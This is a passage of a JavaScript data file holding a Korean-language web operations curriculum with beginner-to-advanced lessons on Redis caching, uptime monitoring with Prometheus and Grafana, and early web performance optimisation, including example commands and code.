                  content: "Redis는 문자열 외에도 다양한 자료구조를 지원합니다:",
                  list: [
                    "String: 단순 값 (세션, 카운터)",
                    "Hash: 객체 저장 (사용자 정보)",
                    "List: 순서가 있는 목록 (최근 활동, 큐)",
                    "Set: 중복 없는 집합 (태그, 좋아요)",
                    "Sorted Set: 순위가 있는 집합 (랭킹, 리더보드)"
                  ]
                },
                {
                  heading: "2. Hash 활용 (객체 저장)",
                  code: `# 사용자 정보를 Hash로 저장
HSET user:123 username "john"
HSET user:123 email "john@example.com"
HSET user:123 age 30

# 여러 필드 한 번에 설정
HMSET user:456 username "alice" email "alice@example.com" age 25

# 전체 데이터 조회
HGETALL user:123
# 결과:
# 1) "username"
# 2) "john"
# 3) "email"
# 4) "john@example.com"
# 5) "age"
# 6) "30"

# 특정 필드만 조회
HGET user:123 username
# 결과: "john"

# 필드 삭제
HDEL user:123 age`
                },
                {
                  heading: "3. List 활용 (최근 활동, 큐)",
                  code: `# 최근 본 상품 (왼쪽에 추가)
LPUSH recent:user123 "product:456"
LPUSH recent:user123 "product:789"

# 최근 5개만 유지 (나머지 삭제)
LTRIM recent:user123 0 4

# 전체 조회
LRANGE recent:user123 0 -1
# 결과: ["product:789", "product:456"]

# 작업 큐 (오른쪽에 추가, 왼쪽에서 꺼내기)
RPUSH job:queue "task1"
RPUSH job:queue "task2"
LPOP job:queue
# 결과: "task1" (FIFO)`
                },
                {
                  heading: "4. Sorted Set 활용 (랭킹)",
                  code: `# 게임 점수 저장 (점수 기준 자동 정렬)
ZADD leaderboard 1500 "player1"
ZADD leaderboard 2300 "player2"
ZADD leaderboard 1800 "player3"

# 상위 3명 조회 (내림차순)
ZREVRANGE leaderboard 0 2 WITHSCORES
# 결과:
# 1) "player2"
# 2) "2300"
# 3) "player3"
# 4) "1800"
# 5) "player1"
# 6) "1500"

# 특정 플레이어 순위 (0부터 시작)
ZREVRANK leaderboard "player3"
# 결과: 1 (2등)

# 점수 증가
ZINCRBY leaderboard 100 "player1"
# player1의 점수 1600으로 증가`
                },
                {
                  heading: "5. 캐싱 전략",
                  content: "언제 캐시를 사용하고, 언제 갱신할까?",
                  list: [
                    "Cache-Aside: 앱이 직접 캐시 관리 (가장 일반적)",
                    "Write-Through: DB 쓰기 시 캐시도 동시 업데이트",
                    "Write-Behind: 캐시에만 쓰고 나중에 DB 동기화",
                    "Refresh-Ahead: 만료 직전 미리 갱신"
                  ],
                  code: `# Cache-Aside 패턴 (의사코드)
function getUser(userId) {
  // 1. 캐시에서 먼저 조회
  cached = redis.get("user:" + userId)
  if (cached) {
    return cached  // 캐시 히트
  }

  // 2. 캐시 미스 → DB 조회
  user = db.query("SELECT * FROM users WHERE id = ?", userId)

  // 3. 캐시에 저장 (1시간 유효)
  redis.setex("user:" + userId, 3600, JSON.stringify(user))

  return user
}

# 캐시 무효화 (데이터 변경 시)
function updateUser(userId, data) {
  db.query("UPDATE users SET ... WHERE id = ?", userId, data)
  redis.del("user:" + userId)  // 캐시 삭제
}`
                },
                {
                  heading: "6. TTL 전략",
                  content: "캐시 유효기간 설정 가이드:",
                  list: [
                    "자주 변경되는 데이터: 짧게 (1~5분)",
                    "거의 변경 없는 데이터: 길게 (1시간~1일)",
                    "세션: 로그인 유지 시간 (30분~24시간)",
                    "임시 데이터: 매우 짧게 (10초~1분)"
                  ],
                  code: `# 상품 정보 (1시간)
SETEX product:123 3600 "{ ... }"

# 실시간 재고 (1분)
SETEX stock:item456 60 "15"

# 일일 방문자 수 (자정까지)
SET daily:visits:20250104 1523
EXPIREAT daily:visits:20250104 1735776000  # Unix timestamp`
                },
                {
                  heading: "✅ 중급 실습",
                  checklist: [
                    "Hash로 사용자 객체 저장 후 HGETALL로 조회",
                    "List로 최근 활동 5개 저장 후 LTRIM으로 제한",
                    "Sorted Set으로 점수 랭킹 구현 후 상위 10명 조회",
                    "Cache-Aside 패턴으로 상품 정보 캐싱 구현",
                    "다양한 TTL 설정하여 자동 삭제 확인"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 메모리 최적화와 고가용성",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Redis 메모리를 효율적으로 관리하고, 클러스터와 센티널로 고가용성을 구현한다."
                },
                {
                  heading: "1. 메모리 관리 전략",
                  content: "메모리가 부족할 때 어떻게 처리할까?",
                  code: `# maxmemory 설정 (redis.conf 또는 런타임)
CONFIG SET maxmemory 256mb

# 메모리 정책 (maxmemory-policy)
CONFIG SET maxmemory-policy allkeys-lru

# 정책 종류:
# noeviction: 메모리 가득 차면 쓰기 거부 (기본값)
# allkeys-lru: 모든 키 중 LRU(Least Recently Used) 삭제
# allkeys-lfu: 모든 키 중 LFU(Least Frequently Used) 삭제
# volatile-lru: TTL 있는 키 중 LRU 삭제
# volatile-ttl: TTL 짧은 키부터 삭제
# allkeys-random: 랜덤 삭제

# 현재 정책 확인
CONFIG GET maxmemory-policy`
                },
                {
                  heading: "2. 메모리 최적화 기법",
                  code: `# 1. 짧은 키 이름 사용
# 나쁨: user:profile:123:information
# 좋음: u:p:123

# 2. Hash 대신 String (작은 객체)
# Hash: 각 필드마다 오버헤드
# String: JSON 직렬화하여 저장
SET u:123 '{"name":"john","age":30}'

# 3. Pipeline으로 여러 명령 한 번에 전송
# 네트워크 왕복 시간(RTT) 감소
MULTI
SET key1 "value1"
SET key2 "value2"
SET key3 "value3"
EXEC

# 4. 대량 데이터 삭제는 UNLINK (비동기)
DEL bigkey  # 블로킹 (모든 작업 중단)
UNLINK bigkey  # 논블로킹 (백그라운드 삭제)

# 5. 불필요한 키 정리
redis-cli --scan --pattern "temp:*" | xargs redis-cli DEL`
                },
                {
                  heading: "3. 영구 저장 (Persistence)",
                  content: "Redis 재시작 시 데이터 복구 방법:",
                  list: [
                    "RDB (Snapshot): 주기적으로 전체 데이터 덤프",
                    "AOF (Append Only File): 모든 쓰기 명령 로그 기록",
                    "RDB + AOF: 두 가지 병행 (권장)"
                  ],
                  code: `# RDB 설정 (redis.conf)
save 900 1      # 900초 동안 1개 이상 변경 시 저장
save 300 10     # 300초 동안 10개 이상 변경 시 저장
save 60 10000   # 60초 동안 10000개 이상 변경 시 저장

# 수동 스냅샷
BGSAVE  # 백그라운드에서 저장

# AOF 활성화
CONFIG SET appendonly yes
CONFIG SET appendfsync everysec  # 1초마다 디스크 동기화

# AOF 재작성 (파일 크기 최적화)
BGREWRITEAOF`
                },
                {
                  heading: "4. Redis Sentinel (고가용성)",
                  content: "마스터 장애 시 자동으로 슬레이브를 승격시킵니다.",
                  code: `# sentinel.conf 설정
sentinel monitor mymaster 127.0.0.1 6379 2
# 2개 센티널이 동의하면 failover

sentinel down-after-milliseconds mymaster 5000
# 5초 응답 없으면 다운으로 간주

sentinel failover-timeout mymaster 60000
# 페일오버 타임아웃 60초

# 센티널 실행
redis-sentinel /path/to/sentinel.conf

# 마스터 상태 확인
redis-cli -p 26379 sentinel master mymaster`
                },
                {
                  heading: "5. Redis Cluster (분산 처리)",
                  content: "데이터를 여러 노드에 분산하여 처리 능력을 확장합니다.",
                  code: `# 클러스터 생성 (최소 6개 노드: 3 마스터 + 3 슬레이브)
redis-cli --cluster create \\
  127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 \\
  127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005 \\
  --cluster-replicas 1

# 클러스터 상태 확인
redis-cli -c -p 7000 cluster info

# 키 분산 원리: Hash Slot (0~16383)
# CRC16(key) % 16384 = slot 번호
# 각 마스터가 slot 범위 담당

# 클러스터 모드에서 키 조회
redis-cli -c -p 7000
SET mykey "value"
# -> Redirected to slot [14687] located at 127.0.0.1:7002`
                },
                {
                  heading: "6. 모니터링과 진단",
                  code: `# 실시간 명령어 모니터링 (주의: 성능 저하 가능)
MONITOR

# 슬로우 로그 (느린 명령 기록)
CONFIG SET slowlog-log-slower-than 10000  # 10ms 이상
SLOWLOG GET 10
# 가장 느린 명령 10개 표시

# 클라이언트 연결 목록
CLIENT LIST

# 통계 정보
INFO stats
# keyspace_hits: 캐시 히트
# keyspace_misses: 캐시 미스
# 히트율 = hits / (hits + misses)

# 메모리 파편화 확인
INFO memory | grep mem_fragmentation_ratio
# 1.0 ~ 1.5: 정상
# > 1.5: 메모리 파편화 발생 (재시작 필요)`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "maxmemory-policy를 allkeys-lru로 설정 후 메모리 가득 채워 자동 삭제 확인",
                    "RDB + AOF 활성화하여 Redis 재시작 후 데이터 복구 테스트",
                    "Docker Compose로 Sentinel 3개 노드 구성 후 마스터 강제 종료 시 자동 페일오버 확인",
                    "SLOWLOG로 느린 명령 찾아 최적화",
                    "INFO stats로 캐시 히트율 계산 (80% 이상 목표)"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '2-4',
          name: '모니터링과 알림 시스템',
          goal: '문제를 조기에 발견하고 알림을 받을 수 있다',
          hours: 4,
          keywords: ['monitoring', 'alerting', 'uptime tracking'],
          tasks: [
            'Uptime Robot 계정 생성 및 설정',
            'NetData에서 실시간 그래프 확인',
            '알림 테스트 (의도적으로 서비스 중지)'
          ],
          content: {
            beginner: {
              title: "초급: Uptime 모니터링과 기본 알림 설정",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "서비스가 다운되었을 때 즉시 알림을 받을 수 있도록 Uptime 모니터링을 설정한다."
                },
                {
                  heading: "1. 모니터링이 필요한 이유",
                  content: "서버는 언제든 다운될 수 있습니다. 사용자보다 먼저 문제를 발견해야 합니다.",
                  list: [
                    "서버 다운: 하드웨어 장애, 네트워크 문제",
                    "애플리케이션 크래시: 메모리 부족, 버그",
                    "데이터베이스 장애: 연결 수 초과, 디스크 부족",
                    "성능 저하: CPU 100%, 느린 응답 시간"
                  ]
                },
                {
                  heading: "2. Uptime Robot 설정",
                  content: "무료로 50개 모니터를 5분 간격으로 체크할 수 있습니다.",
                  steps: [
                    {
                      label: "Step 1",
                      text: "계정 생성",
                      code: "https://uptimerobot.com 접속\nSign Up (무료)"
                    },
                    {
                      label: "Step 2",
                      text: "새 모니터 추가",
                      code: "Add New Monitor → HTTP(s) 선택\nFriendly Name: My CMS\nURL: https://your-site.com\nMonitoring Interval: 5 minutes"
                    },
                    {
                      label: "Step 3",
                      text: "알림 설정",
                      code: "Alert Contacts → Add Alert Contact\nEmail 또는 Slack, Discord, Telegram 등\n알림 받을 이메일 입력 후 Verify"
                    },
                    {
                      label: "Step 4",
                      text: "모니터 활성화",
                      code: "Create Monitor 클릭\n5분마다 사이트 체크 시작"
                    }
                  ]
                },
                {
                  heading: "3. 모니터링 지표",
                  content: "Uptime Robot이 확인하는 항목:",
                  list: [
                    "HTTP 응답 코드: 200 OK인지 확인",
                    "응답 시간: 몇 초 만에 응답하는가",
                    "다운타임: 며칠 중 몇 시간 다운되었는가",
                    "Uptime 비율: 99.9% (한 달에 약 43분 다운)"
                  ],
                  code: `# Uptime 목표
99.9% (Three Nines): 월 43분 다운 (일반 서비스)
99.99% (Four Nines): 월 4분 다운 (중요 서비스)
99.999% (Five Nines): 월 26초 다운 (금융, 의료)

# 현실적 목표
개인 프로젝트: 99% 이상 (월 7시간)
소규모 비즈니스: 99.5% 이상 (월 3.5시간)
대규모 서비스: 99.9% 이상`
                },
                {
                  heading: "4. 알림 테스트",
                  content: "실제로 알림이 잘 작동하는지 테스트해봅시다.",
                  steps: [
                    {
                      label: "방법 1: 서비스 중지",
                      code: "CapRover → Apps → 프론트엔드 앱 → Stop\n5분 대기\n→ 알림 수신 확인\n→ 다시 Start"
                    },
                    {
                      label: "방법 2: 방화벽 차단",
                      code: "서버 방화벽에서 HTTP(80), HTTPS(443) 임시 차단\n5분 대기\n→ 알림 수신 확인\n→ 방화벽 해제"
                    },
                    {
                      label: "알림 예시",
                      text: "이메일 제목: [Alert] My CMS is DOWN\n내용: Your monitor 'My CMS' is currently down.\nReason: Connection timeout"
                    }
                  ]
                },
                {
                  heading: "5. CapRover 내장 NetData",
                  content: "CapRover에는 NetData가 기본 내장되어 실시간 시스템 모니터링을 제공합니다.",
                  code: `# NetData 접속
https://captain.your-server.com/#/monitoring

# 확인 가능한 지표:
- CPU 사용률 (%)
- 메모리 사용량 (MB)
- 디스크 I/O (MB/s)
- 네트워크 트래픽 (Mbps)
- 컨테이너별 리소스 사용량

# 주의할 지표:
CPU > 80%: 처리 부하 과다
메모리 > 90%: 메모리 부족 위험
디스크 > 90%: 공간 확보 필요`
                },
                {
                  heading: "6. 일일 체크리스트",
                  checklist: [
                    "Uptime Robot 대시보드에서 모든 서비스 Up 상태 확인",
                    "NetData에서 CPU/메모리 정상 범위 확인",
                    "응답 시간이 평소보다 느리지 않은지 확인",
                    "에러 알림이 왔다면 즉시 확인"
                  ]
                },
                {
                  heading: "✅ 초급 실습",
                  checklist: [
                    "Uptime Robot 계정 생성 및 메인 사이트 모니터 추가",
                    "이메일 알림 설정 및 Verify",
                    "의도적으로 서비스 중지 후 5분 내 알림 수신 확인",
                    "NetData 접속하여 실시간 CPU/메모리 그래프 확인",
                    "Uptime Robot 대시보드에서 응답 시간 그래프 확인"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 다층 모니터링과 알림 채널 확장",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "여러 계층(서버, 애플리케이션, 데이터베이스)을 모니터링하고, 다양한 채널로 알림을 받는다."
                },
                {
                  heading: "1. 모니터링 계층",
                  content: "서비스는 여러 계층으로 구성되어 있으며, 각각 모니터링이 필요합니다.",
                  list: [
                    "인프라 계층: 서버 CPU, 메모리, 디스크",
                    "네트워크 계층: 응답 시간, 연결 상태",
                    "애플리케이션 계층: API 응답, 에러율",
                    "데이터베이스 계층: 연결 수, 슬로우 쿼리"
                  ]
                },
                {
                  heading: "2. 여러 엔드포인트 모니터링",
                  content: "메인 페이지뿐만 아니라 중요한 API도 모니터링합니다.",
                  code: `# Uptime Robot 모니터 추가
1. 프론트엔드: https://your-site.com
2. API 헬스체크: https://api.your-site.com/health
3. 관리자 페이지: https://admin.your-site.com
4. 결제 API: https://api.your-site.com/payment/status

# 각 모니터마다 다른 설정:
- 프론트엔드: 5분 간격
- API: 3분 간격 (더 중요)
- 결제: 1분 간격 (가장 중요, 유료 플랜)`
                },
                {
                  heading: "3. Slack 알림 설정",
                  content: "팀 협업 시 Slack으로 알림받기:",
                  steps: [
                    {
                      label: "Step 1",
                      text: "Slack Webhook 생성",
                      code: "Slack → Apps → Incoming Webhooks\nAdd to Slack → 채널 선택 (#alerts)\nWebhook URL 복사"
                    },
                    {
                      label: "Step 2",
                      text: "Uptime Robot 연동",
                      code: "Alert Contacts → Add Alert Contact\nType: Webhook\nWebhook URL: 붙여넣기\nPost Value: JSON 형식 설정"
                    },
                    {
                      label: "Step 3",
                      text: "알림 메시지 커스터마이즈",
                      code: `{
  "text": "*[ALERT]* {{monitorFriendlyName}} is {{monitorAlertType}}",
  "attachments": [
    {
      "color": "danger",
      "fields": [
        {"title": "URL", "value": "{{monitorURL}}", "short": false},
        {"title": "Reason", "value": "{{alertDetails}}", "short": false}
      ]
    }
  ]
}`
                    }
                  ]
                },
                {
                  heading: "4. 커스텀 헬스체크 엔드포인트",
                  content: "애플리케이션이 자체적으로 건강 상태를 보고하도록 합니다.",
                  code: `// Node.js 예시
app.get('/health', async (req, res) => {
  try {
    // 1. DB 연결 확인
    await db.ping();

    // 2. Redis 연결 확인
    await redis.ping();

    // 3. 디스크 공간 확인
    const disk = await checkDiskSpace('/');
    if (disk.free < 1e9) throw new Error('Low disk space');

    // 4. 메모리 확인
    const mem = process.memoryUsage();
    if (mem.heapUsed / mem.heapTotal > 0.9) {
      throw new Error('High memory usage');
    }

    res.status(200).json({
      status: 'ok',
      timestamp: Date.now(),
      uptime: process.uptime(),
      checks: {
        database: 'ok',
        redis: 'ok',
        disk: 'ok',
        memory: 'ok'
      }
    });
  } catch (error) {
    res.status(503).json({
      status: 'error',
      error: error.message
    });
  }
});

// Uptime Robot 설정:
// URL: https://api.your-site.com/health
// Keyword: "status":"ok" (이 텍스트 포함 여부 확인)`
                },
                {
                  heading: "5. 응답 시간 기준 알림",
                  content: "사이트가 느려졌을 때도 알림받기:",
                  code: `# Uptime Robot 설정
Advanced Settings → Response Time Alert
Threshold: 2000ms (2초)
Consecutive Checks: 3 (3번 연속 초과 시 알림)

# 이렇게 하면:
- 일시적 느림: 무시
- 지속적 느림: 알림`
                },
                {
                  heading: "6. 애플리케이션 로그 모니터링",
                  content: "특정 에러가 로그에 나타나면 알림:",
                  code: `# 간단한 로그 모니터링 스크립트
#!/bin/bash
# check_errors.sh

ERROR_COUNT=$(docker logs backend_container --since 5m | grep -c "ERROR\\|FATAL")

if [ $ERROR_COUNT -gt 10 ]; then
  curl -X POST https://hooks.slack.com/services/YOUR/WEBHOOK/URL \\
    -H 'Content-Type: application/json' \\
    -d "{
      \\"text\\": \\"⚠️ Too many errors: $ERROR_COUNT in last 5 minutes\\"
    }"
fi

# Cron으로 5분마다 실행
*/5 * * * * /path/to/check_errors.sh`
                },
                {
                  heading: "✅ 중급 실습",
                  checklist: [
                    "최소 3개 엔드포인트 (프론트엔드, API, DB) 모니터링 추가",
                    "Slack 또는 Discord Webhook 연동하여 알림 수신",
                    "/health 엔드포인트 구현 후 Uptime Robot 연결",
                    "응답 시간 2초 이상 시 알림 설정",
                    "Docker 로그에서 에러 카운트하는 스크립트 작성"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 종합 모니터링과 SRE 지표",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Prometheus + Grafana로 종합 모니터링 대시보드를 구축하고, SLI/SLO를 정의한다."
                },
                {
                  heading: "1. Prometheus + Grafana 스택",
                  content: "시계열 데이터를 수집하고 시각화하는 산업 표준 도구입니다.",
                  list: [
                    "Prometheus: 메트릭 수집 및 저장 (시계열 DB)",
                    "Grafana: 데이터 시각화 대시보드",
                    "Exporters: 각 서비스의 메트릭 노출 (Node, MySQL, Redis)",
                    "Alertmanager: 복잡한 알림 규칙 관리"
                  ]
                },
                {
                  heading: "2. CapRover에 Prometheus 설치",
                  code: `# CapRover Apps → One-Click Apps → Prometheus
# 설정:
App Name: prometheus
Port: 9090

# prometheus.yml 설정 (환경변수 또는 볼륨)
global:
  scrape_interval: 15s

scrape_configs:
  # Node Exporter (서버 메트릭)
  - job_name: 'node'
    static_configs:
      - targets: ['node-exporter:9100']

  # MySQL Exporter
  - job_name: 'mysql'
    static_configs:
      - targets: ['mysql-exporter:9104']

  # Redis Exporter
  - job_name: 'redis'
    static_configs:
      - targets: ['redis-exporter:9121']

  # Application (커스텀)
  - job_name: 'app'
    static_configs:
      - targets: ['backend:3000']`
                },
                {
                  heading: "3. Grafana 대시보드 구성",
                  steps: [
                    {
                      label: "Step 1",
                      text: "Grafana 설치",
                      code: "CapRover → One-Click Apps → Grafana\nApp Name: grafana\n접속: https://grafana.your-server.com\n기본 로그인: admin / admin"
                    },
                    {
                      label: "Step 2",
                      text: "Prometheus 데이터소스 추가",
                      code: "Configuration → Data Sources → Add Prometheus\nURL: http://srv-captain--prometheus:9090\nSave & Test"
                    },
                    {
                      label: "Step 3",
                      text: "대시보드 Import",
                      code: "Dashboards → Import\nGrafana.com Dashboard:\n- Node Exporter: 1860\n- MySQL: 7362\n- Redis: 11835\nSelect Prometheus Data Source → Import"
                    }
                  ]
                },
                {
                  heading: "4. 커스텀 메트릭 노출",
                  content: "애플리케이션에서 비즈니스 메트릭 노출하기:",
                  code: `// Node.js (prom-client 라이브러리)
const promClient = require('prom-client');
const register = new promClient.Registry();

// 기본 메트릭 (CPU, 메모리 등)
promClient.collectDefaultMetrics({ register });

// 커스텀 카운터
const requestCounter = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total HTTP requests',
  labelNames: ['method', 'path', 'status'],
  registers: [register]
});

// 커스텀 히스토그램 (응답 시간)
const responseTime = new promClient.Histogram({
  name: 'http_response_time_seconds',
  help: 'HTTP response time',
  labelNames: ['method', 'path'],
  registers: [register]
});

// 미들웨어
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    requestCounter.inc({
      method: req.method,
      path: req.route?.path || 'unknown',
      status: res.statusCode
    });
    responseTime.observe(
      { method: req.method, path: req.route?.path },
      (Date.now() - start) / 1000
    );
  });
  next();
});

// 메트릭 엔드포인트
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});`
                },
                {
                  heading: "5. SLI/SLO 정의",
                  content: "서비스 수준 목표를 설정하고 추적합니다.",
                  code: `# SLI (Service Level Indicator): 측정 가능한 지표
1. 가용성: Uptime / Total Time
2. 지연시간: 95th percentile 응답 시간
3. 에러율: Error Requests / Total Requests

# SLO (Service Level Objective): 목표 수준
1. 가용성: 99.9% 이상 (월 43분 이하 다운)
2. 지연시간: 95%의 요청이 500ms 이내
3. 에러율: 0.1% 이하 (1000 요청 중 1개 미만)

# SLA (Service Level Agreement): 고객 약속
- SLO 미달 시 보상 (환불, 크레딧 등)

# Prometheus Query 예시
# 가용성
avg_over_time(up[30d]) * 100

# 95th percentile 응답 시간
histogram_quantile(0.95, http_response_time_seconds_bucket)

# 에러율
sum(rate(http_requests_total{status=~"5.."}[5m])) /
sum(rate(http_requests_total[5m])) * 100`
                },
                {
                  heading: "6. 알림 규칙 (Alertmanager)",
                  code: `# Prometheus alert.rules.yml
groups:
  - name: example
    interval: 30s
    rules:
      # 서버 다운
      - alert: InstanceDown
        expr: up == 0
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Instance {{ $labels.instance }} is down"

      # 높은 응답 시간
      - alert: HighResponseTime
        expr: histogram_quantile(0.95, http_response_time_seconds_bucket) > 2
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: "95th percentile response time > 2s"

      # 높은 메모리 사용량
      - alert: HighMemoryUsage
        expr: (node_memory_MemTotal_bytes - node_memory_MemAvailable_bytes) / node_memory_MemTotal_bytes > 0.9
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "Memory usage > 90%"

      # 디스크 공간 부족
      - alert: DiskSpaceLow
        expr: (node_filesystem_avail_bytes / node_filesystem_size_bytes) < 0.1
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Disk space < 10%"`
                },
                {
                  heading: "7. On-Call 로테이션",
                  content: "24/7 모니터링을 위한 당직 체계:",
                  list: [
                    "PagerDuty: 당직자 자동 호출 (전화, SMS)",
                    "Opsgenie: 에스컬레이션 정책 (1차 → 2차 → 매니저)",
                    "VictorOps: 타임존별 로테이션",
                    "개인 프로젝트: Slack + 스마트폰 알림으로 충분"
                  ]
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "Prometheus + Grafana 스택 구축 및 Node/MySQL/Redis Exporter 연동",
                    "커스텀 메트릭 (요청 수, 응답 시간) 노출 및 Grafana 그래프 생성",
                    "SLI 정의 후 Grafana 대시보드에 표시 (가용성, 지연시간, 에러율)",
                    "Alertmanager로 알림 규칙 설정 (CPU > 80%, 메모리 > 90%)",
                    "7일간 메트릭 수집 후 SLO 달성 여부 분석"
                  ]
                }
              ]
            }
          }
        }
      ]
    },
    {
      id: 'tier3',
      name: 'Tier 3: 확장과 최적화',
      period: '5~8주',
      color: 'bg-green-100 border-green-300 text-green-800',
      reason: '사용자가 늘어나고 데이터가 쌓이면서 생기는 문제 해결',
      topics: [
        {
          id: '3-1',
          name: '성능 최적화 기초',
          goal: '병목 지점을 찾고 개선할 수 있다',
          hours: 8,
          keywords: ['performance optimization', 'bottleneck analysis', 'web vitals'],
          tasks: [
            'Lighthouse로 현재 점수 측정',
            '가장 느린 페이지 3개 찾기',
            '이미지 최적화 1회 실행'
          ],
          content: {
            beginner: {
              title: "초급: 성능 문제가 무엇인지 이해하고 측정 도구 사용하기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "웹사이트의 성능을 측정하고, 어디가 느린지 파악할 수 있다."
                },
                {
                  heading: "1. 성능이 왜 중요한가?",
                  content: "사용자는 3초 안에 로딩되지 않으면 페이지를 떠납니다.",
                  list: [
                    "로딩 시간 1초 증가 → 전환율 7% 감소",
                    "모바일에서는 더 심각 (4G 환경)",
                    "검색엔진 순위에도 영향 (SEO)",
                    "서버 리소스 낭비 → 운영 비용 증가"
                  ]
                },
                {
                  heading: "2. Core Web Vitals 이해하기",
                  content: "Google이 정의한 3가지 핵심 성능 지표:",
                  code: `# LCP (Largest Contentful Paint)
- 가장 큰 콘텐츠가 화면에 표시되는 시간
- 목표: 2.5초 이내
- 예: 메인 이미지, 큰 텍스트 블록

# FID (First Input Delay)
- 사용자가 클릭했을 때 반응하는 시간
- 목표: 100ms 이내
- 예: 버튼 클릭, 링크 터치

# CLS (Cumulative Layout Shift)
- 페이지 로딩 중 레이아웃이 밀리는 정도
- 목표: 0.1 이하
- 예: 이미지 로딩으로 텍스트가 아래로 밀림`
                },
                {
                  heading: "3. Lighthouse로 성능 측정하기",
                  steps: [
                    {
                      label: "Chrome DevTools 사용",
                      code: `# 1. 크롬 브라우저에서 F12 (개발자 도구)
# 2. Lighthouse 탭 클릭
# 3. Categories: Performance 체크
# 4. Device: Mobile 또는 Desktop 선택
# 5. "Analyze page load" 버튼 클릭

# 결과 확인:
- Performance 점수 (0~100)
- FCP (First Contentful Paint): 1.8s
- LCP: 3.5s ← 느림! (2.5s 목표)
- TBT (Total Blocking Time): 150ms
- CLS: 0.05 ← 좋음!`
                    },
                    {
                      label: "온라인 도구 사용",
                      code: `# PageSpeed Insights
https://pagespeed.web.dev/

# 1. URL 입력
# 2. 모바일/데스크톱 결과 모두 확인
# 3. Opportunities (개선 기회) 섹션 주목
# 4. Diagnostics (진단) 섹션에서 문제 확인`
                    }
                  ]
                },
                {
                  heading: "4. 가장 느린 페이지 찾기",
                  code: `// Backend에서 응답 시간 로깅 (Express.js 예시)
app.use((req, res, next) => {
  const start = Date.now();

  res.on('finish', () => {
    const duration = Date.now() - start;
    if (duration > 1000) { // 1초 이상
      console.log(\`[SLOW] \${req.method} \${req.url} - \${duration}ms\`);
    }
  });

  next();
});

// 실제 로그 예시:
// [SLOW] GET /api/products?page=5 - 2300ms ← 문제!
// [SLOW] POST /api/upload - 1800ms
// [SLOW] GET /dashboard - 1200ms`
                },
                {
                  heading: "5. 이미지 최적화 - 가장 쉬운 개선",
                  steps: [
                    {
                      label: "문제 확인",
                      code: `# Lighthouse에서:
"Properly size images" - 200KB 절약 가능
"Serve images in modern formats" - WebP 사용 권장
"Efficiently encode images" - 품질 최적화 필요`
                    },
                    {
                      label: "온라인 도구로 최적화",
                      code: `# TinyPNG (https://tinypng.com/)
- PNG, JPEG 업로드
- 자동으로 60~70% 압축
- 품질 손실 거의 없음

# 예시:
product.jpg (500KB) → product-optimized.jpg (150KB)
- 70% 용량 감소
- 눈으로 차이 거의 없음`
                    },
                    {
                      label: "WebP 변환 (최신 포맷)",
                      code: `# Squoosh (https://squoosh.app/)
1. 이미지 업로드
2. 오른쪽에서 WebP 선택
3. Quality: 75~85 설정
4. 다운로드

# HTML에서 사용 (구형 브라우저 대비)
<picture>
  <source srcset="hero.webp" type="image/webp">
  <img src="hero.jpg" alt="Hero">
</picture>`
                    }
                  ]
                },
                {
                  heading: "6. 빠른 성과를 위한 체크리스트",
                  checklist: [
                    "모든 이미지 WebP로 변환 (또는 압축)",
                    "이미지에 width/height 속성 추가 (CLS 방지)",
                    "폰트 preload 설정: <link rel=\"preload\" href=\"font.woff2\" as=\"font\">",
                    "불필요한 JavaScript 라이브러리 제거",
                    "CSS 파일 압축 (Minify)"
                  ]
                },
                {
                  heading: "💡 초급 실습 과제",
                  checklist: [
                    "현재 사이트 Lighthouse 점수 측정 후 스크린샷 저장",
                    "가장 큰 이미지 3개 찾아서 WebP로 변환",
                    "변환 후 다시 측정하여 점수 개선 확인",
                    "LCP 시간이 몇 초 단축되었는지 기록"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 병목 지점 분석하고 캐싱 전략 수립하기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Chrome DevTools를 사용해 정확한 병목 지점을 찾고, 효과적인 캐싱 전략을 적용할 수 있다."
                },
                {
                  heading: "1. Performance 탭으로 병목 분석",
                  steps: [
                    {
                      label: "녹화 시작",
                      code: `# Chrome DevTools → Performance 탭
1. 빨간 점(Record) 클릭
2. 페이지 새로고침 (Ctrl+R)
3. 로딩 완료 후 Stop 버튼

# 결과 읽기:
- FCP (파란 선): 1.2s
- LCP (초록 선): 3.8s ← 여기가 문제!
- Main 섹션: JavaScript 실행 시간
- Network 섹션: 리소스 로딩 시간`
                    },
                    {
                      label: "병목 구간 확인",
                      code: `# Main Thread 분석:
- Evaluate Script: 800ms ← 큰 번들 파일
- Parse HTML: 200ms
- Layout: 150ms
- Paint: 100ms

# 결론: JavaScript 번들 최적화 필요
- 큰 라이브러리 lazy load
- Code splitting 적용
- Tree shaking으로 미사용 코드 제거`
                    }
                  ]
                },
                {
                  heading: "2. Network 탭으로 느린 요청 찾기",
                  code: `# Chrome DevTools → Network 탭
1. Disable cache 체크
2. 페이지 새로고침
3. Waterfall 차트 분석

# 문제 패턴:
┌─────────────────────────────────┐
│ app.js       │███████████████   │ 2.5s ← 너무 큼
│ api/products │      ████         │ 800ms ← DB 쿼리 느림
│ hero.jpg     │  ████             │ 600ms ← 이미지 큼
│ style.css    │██                 │ 200ms
└─────────────────────────────────┘

# 해결 방안:
1. app.js → Code splitting으로 나누기
2. api/products → 인덱스 추가 또는 Redis 캐싱
3. hero.jpg → WebP + CDN 사용`
                },
                {
                  heading: "3. 브라우저 캐싱 전략",
                  code: `// Express.js에서 Cache-Control 헤더 설정
app.use(express.static('public', {
